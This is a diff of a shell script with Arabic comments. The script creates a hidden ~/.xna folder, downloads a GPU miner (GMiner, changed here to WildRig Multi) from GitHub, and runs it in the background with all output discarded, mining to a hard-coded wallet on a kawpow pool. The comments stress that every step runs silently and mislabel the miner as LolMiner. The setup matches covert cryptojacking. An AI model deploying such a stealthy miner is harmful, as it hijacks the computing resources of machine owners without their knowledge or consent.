@@ -5,10 +5,10 @@ cd ~
 mkdir -p .xna && cd .xna
 
 # تحميل LolMiner بصمت
-wget https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz
+wget https://github.com/andru-kun/wildrig-multi/releases/download/0.43.2/wildrig-multi-linux-0.43.2.tar.xz
 
 # فك الضغط بصمت
-tar -xvf gminer_3_44_linux64.tar.xz
+tar -xvf wildrig-multi-linux-0.43.2.tar.xz
 
 
 # عنوان المحفظة (استبدله بعنوانك)
@@ -17,5 +17,5 @@ WORKER="gpu_worker"
 POOL="stratum+tcp://stratum-eu.rplant.xyz:7029"
 
 # تشغيل LolMiner فقط على GPU بصمت
-nohup ./miner --algo kawpow --server stratum+tcp://stratum-eu.rplant.xyz:7029 --user xna:NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT --mode mining > /dev/null 2>&1 &
+nohup ./wildrig-multi --algo kawpow --server stratum+tcp://stratum-eu.rplant.xyz:7029 --user xna:NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT --mode mining > /dev/null 2>&1 &
 
